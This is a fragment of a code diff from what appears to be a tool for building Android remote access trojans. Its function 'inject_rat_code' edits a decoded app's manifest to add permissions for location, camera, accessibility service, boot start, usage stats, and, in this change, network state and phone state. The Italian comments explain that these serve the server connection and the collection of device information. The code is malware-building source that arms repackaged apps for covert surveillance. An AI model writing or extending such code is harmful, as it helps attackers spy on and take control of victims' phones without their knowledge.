@@ -443,7 +443,8 @@ def inject_rat_code(username, decoded_path, server_ip, server_port, flask_port):
     append_flask_log(username, "AndroidManifest.xml loaded for modification.")
     
     permissions_to_add = [
-        "android.permission.INTERNET",
+        "android.permission.INTERNET",  # Fondamentale per la connessione al server
+        "android.permission.ACCESS_NETWORK_STATE",  # Necessario per verificare la connettività
         "android.permission.ACCESS_FINE_LOCATION",
         "android.permission.ACCESS_COARSE_LOCATION",
         "android.permission.RECEIVE_BOOT_COMPLETED",
@@ -454,7 +455,8 @@ def inject_rat_code(username, decoded_path, server_ip, server_port, flask_port):
         "android.permission.CAMERA",
         "android.permission.SYSTEM_ALERT_WINDOW",
         "android.permission.BIND_ACCESSIBILITY_SERVICE",
-        "android.permission.PACKAGE_USAGE_STATS"
+        "android.permission.PACKAGE_USAGE_STATS",
+        "android.permission.READ_PHONE_STATE"  # Aggiunto per ottenere informazioni sul dispositivo
     ]
     
     existing_permissions = set()
